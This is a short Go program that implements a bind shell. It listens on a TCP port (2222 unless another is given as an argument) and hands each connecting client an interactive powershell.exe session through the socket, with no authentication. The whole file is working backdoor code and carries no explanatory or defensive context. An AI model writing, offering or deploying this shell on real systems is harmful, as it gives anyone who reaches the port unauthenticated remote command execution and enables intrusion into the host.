package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
)

func main() {
	port := "2222"
	if len(os.Args) > 1 {
		port = os.Args[1]
	}
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fmt.Printf("bind shell on :%s\n", port)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		cmd := exec.Command("powershell.exe")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
		conn.Close()
	}
}
